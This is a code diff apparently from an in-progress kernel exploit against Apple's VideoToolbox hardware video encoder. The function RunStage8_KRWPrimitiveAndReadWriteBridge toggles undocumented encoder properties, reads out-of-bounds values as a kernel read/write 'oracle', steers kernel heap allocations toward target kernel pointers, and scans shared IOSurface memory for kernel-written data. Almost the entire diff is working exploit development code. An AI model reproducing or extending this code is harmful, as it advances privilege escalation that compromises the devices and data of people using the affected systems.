@@ -2672,7 +2672,14 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                     CFRelease(rbQ1b);
                 }
 
+                NSDictionary *kfProps = @{ (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES };
                 OSStatus stHw8 = VTSessionSetProperty(rwS, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
+                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
+                OSStatus enc1St = VTCompressionSessionEncodeFrame(rwS, pxHold, CMTimeMake(1, 30), kCMTimeInvalid,
+                                                                  (__bridge CFDictionaryRef)kfProps, NULL, NULL);
+                int w1 = 0;
+                while (rwRes->cbCount < 2 && w1 < 80) { usleep(2000); w1 += 2; }
+                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                 int afterHw8Oob0 = -1, afterHw8Alias32 = -1;
                 CFTypeRef rbHw8 = NULL;
                 if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbHw8) == noErr && rbHw8) {
@@ -2684,12 +2691,31 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                     CFRelease(rbHw8);
                 }
 
-                KPH9OutAppend(log, @"  krwToggleOracle[x19+0x7060..0x7067]: base=0x%08x -> Q1.0(%d)=0x%08x(alias30=0x%08x) -> cqpNeg4(%d)=0x%08x(alias30=0x%08x) -> Q1.0(%d)=0x%08x(alias30=0x%08x) | oob0[+0x7064]: 0x%08x -> Hw8(%d)=0x%08x(alias32=0x%08x)\n",
+                OSStatus stHwOff8 = VTSessionSetProperty(rwS, CFSTR("HwFeatureOff"), (__bridge CFNumberRef)@8);
+                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
+                OSStatus enc2St = VTCompressionSessionEncodeFrame(rwS, pxHold, CMTimeMake(2, 30), kCMTimeInvalid,
+                                                                  (__bridge CFDictionaryRef)kfProps, NULL, NULL);
+                int w2 = 0;
+                while (rwRes->cbCount < 3 && w2 < 80) { usleep(2000); w2 += 2; }
+                VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
+                int afterHwOffOob0 = -1, afterHwOffAlias32 = -1;
+                CFTypeRef rbHwOff = NULL;
+                if (VTSessionCopyProperty(rwS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbHwOff) == noErr && rbHwOff) {
+                    NSArray *nsHwOff = (__bridge NSArray *)rbHwOff;
+                    if ([nsHwOff isKindOfClass:[NSArray class]] && nsHwOff.count >= 72) {
+                        afterHwOffOob0 = [nsHwOff[17] intValue];
+                        afterHwOffAlias32 = [nsHwOff[32] intValue];
+                    }
+                    CFRelease(rbHwOff);
+                }
+
+                KPH9OutAppend(log, @"  krwToggleOracle[x19+0x7060..0x7067]: base=0x%08x -> Q1.0(%d)=0x%08x(alias30=0x%08x) -> cqpNeg4(%d)=0x%08x(alias30=0x%08x) -> Q1.0(%d)=0x%08x(alias30=0x%08x) | oob0[+0x7064]: 0x%08x -> Hw8(%d,enc=%d)=0x%08x(alias32=0x%08x) -> HwOff8(%d,enc=%d)=0x%08x(alias32=0x%08x)\n",
                               (unsigned)baseCr7,
                               (int)stWriteQ1, (unsigned)afterQ1Cr7, (unsigned)afterQ1Alias30,
                               (int)stWriteCqpNeg4, (unsigned)afterCqpNeg4Cr7, (unsigned)afterCqpNeg4Alias30,
                               (int)stWriteQ1Again, (unsigned)afterQ1AgainCr7, (unsigned)afterQ1AgainAlias30,
-                              (unsigned)beforeHw8Oob0, (int)stHw8, (unsigned)afterHw8Oob0, (unsigned)afterHw8Alias32);
+                              (unsigned)beforeHw8Oob0, (int)stHw8, (int)enc1St, (unsigned)afterHw8Oob0, (unsigned)afterHw8Alias32,
+                              (int)stHwOff8, (int)enc2St, (unsigned)afterHwOffOob0, (unsigned)afterHwOffAlias32);
 
                 VTSessionSetProperty(rwS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
                 @synchronized ([KPH9EncoderModule class]) { rwRes->closed = 1; }
@@ -2700,8 +2726,8 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
             if (pxHold) CVPixelBufferRelease(pxHold);
             dispatch_semaphore_signal(rwSem);
         });
-        if (dispatch_semaphore_wait(rwSem, dispatch_time(DISPATCH_TIME_NOW, 1200 * (int64_t)NSEC_PER_MSEC)) != 0) {
-            KPH9OutAppend(log, @"  8A multiPpsRead: timed out (>1200ms)\n");
+        if (dispatch_semaphore_wait(rwSem, dispatch_time(DISPATCH_TIME_NOW, 1800 * (int64_t)NSEC_PER_MSEC)) != 0) {
+            KPH9OutAppend(log, @"  8A multiPpsRead: timed out (>1800ms)\n");
         }
     }
 
@@ -2908,6 +2934,7 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
 
         // Run dynamic NTL heap-band steering sessions with raw EncoderUsage=1 + RealTime=NO (so prep=0)
         // paired with a sibling DPB-shaping session (so EnableUserRefForFacetime does not trigger -17691 on `s`).
+        CVPixelBufferRef steerPx = KPH9CreatePixelBuffer(1280, 720);
         for (int ti = 0; ti < nTargets; ti++) {
             int sntl = targetNTLs[ti];
             uint64_t origKPtr = targetKPtrs[ti];
@@ -2915,9 +2942,10 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
             uint32_t lo32 = (uint32_t)(steeredX0 & 0xffffffffULL);
             uint32_t hi32 = (uint32_t)(steeredX0 >> 32);
 
+            Stage6ProbeResult *sRes = Stage6AllocResult();
             VTCompressionSessionRef s = NULL;
-            if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
-                                           NULL, NULL, NULL, NULL, NULL, &s) == noErr && s) {
+            if (sRes && VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+                                                   NULL, NULL, NULL, Stage6OutputCallback, sRes, &s) == noErr && s) {
                 OSStatus uSt = VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                 VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                 OSStatus pubSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(sntl));
@@ -2948,14 +2976,25 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                     CFNumberGetValue(rb, kCFNumberIntType, &postPub); CFRelease(rb);
                 }
-                KPH9SafeTeardown(s);
+                OSStatus encSt = -1;
+                if (steerPx && sntl < 16463) {
+                    encSt = VTCompressionSessionEncodeFrame(s, steerPx, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    int w0 = 0;
+                    while (sRes->cbCount < 1 && w0 < 40) { usleep(2000); w0 += 2; }
+                }
+                OSStatus cbSt = sRes->lastStatus;
+                @synchronized ([KPH9EncoderModule class]) { sRes->closed = 1; }
+                KPH9SafeTeardownEx(s, NULL, sRes);
                 if (dpbSib) KPH9SafeTeardown(dpbSib);
 
-                KPH9OutAppend(log, @"  dynSteer[kptr=0x%016llx -> NTL=%d x0=0x%016llx]: usage=%d pubSet=%d dpb34=%d PRE=%d prep=%d POST=%d\n",
+                KPH9OutAppend(log, @"  dynSteer[kptr=0x%016llx -> NTL=%d x0=0x%016llx]: usage=%d pubSet=%d dpb34=%d PRE=%d prep=%d POST=%d enc=%d(cb=%d)\n",
                               origKPtr, sntl, steeredX0, (int)uSt, (int)pubSt, (int)dpbSt,
-                              prePub, (int)prepSt, postPub);
+                              prePub, (int)prepSt, postPub, (int)encSt, (int)cbSt);
+            } else if (sRes) {
+                free(sRes);
             }
         }
+        if (steerPx) CVPixelBufferRelease(steerPx);
 
         // Scan shared IOSurface pool for any kernel-written qwords != tag
         int surfMutations = 0;
@@ -2970,8 +3009,13 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
             if (base && allocSz >= 64) {
                 for (size_t qi = 0; qi < allocSz / 8 && surfMutations < 8; qi++) {
                     if (base[qi] != expectedTag) {
-                        KPH9OutAppend(log, @"    surfDelta[sid=%@ idx=%lu +0x%zx]: 0x%016llx (expected 0x%016llx)\n",
-                                      sharedIDs[si], (unsigned long)si, qi * 8, base[qi], expectedTag);
+                        size_t pageOff = (qi * 8) & ~(size_t)0x3fffULL;
+                        uint64_t unal59 = 0;
+                        if (pageOff + 0x59 + sizeof(uint64_t) <= allocSz) {
+                            memcpy(&unal59, (const uint8_t *)base + pageOff + 0x59, sizeof(uint64_t));
+                        }
+                        KPH9OutAppend(log, @"    surfDelta[sid=%@ idx=%lu +0x%zx]: 0x%016llx (expected 0x%016llx, page59=0x%016llx)\n",
+                                      sharedIDs[si], (unsigned long)si, qi * 8, base[qi], expectedTag, unal59);
                         surfMutations++;
                     }
                 }
